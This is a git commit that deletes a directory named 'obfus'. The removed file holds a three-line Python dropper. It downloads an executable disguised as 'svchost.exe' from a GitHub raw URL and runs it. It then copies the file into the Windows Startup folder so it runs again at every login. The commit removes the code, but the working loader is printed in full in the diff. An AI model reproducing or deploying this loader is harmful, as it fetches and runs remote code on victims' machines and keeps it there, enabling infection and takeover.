0860c2f32e6a04de563e173514051fbbea36883d
Lust <86266617+datascraped@users.noreply.github.com>
2024-07-18 20:25:49 +0100

    Delete obfus directory

--- obfus/1line.py
+++
@@ -1,3 +0,0 @@
-import os;import requests;f="svchost.exe";open(f,'wb').write(requests.get("https://github.com/vealoncord/Celex/raw/main/"+f).content);os.system(f)
-import time;time.sleep(13)
-import shutil;shutil.move(os.path.join(os.getcwd(),"svchost.exe"),os.path.join(os.path.join(os.getenv("APPDATA"),"Microsoft\Windows\Start Menu\Programs\Startup"),"svchost.exe"))
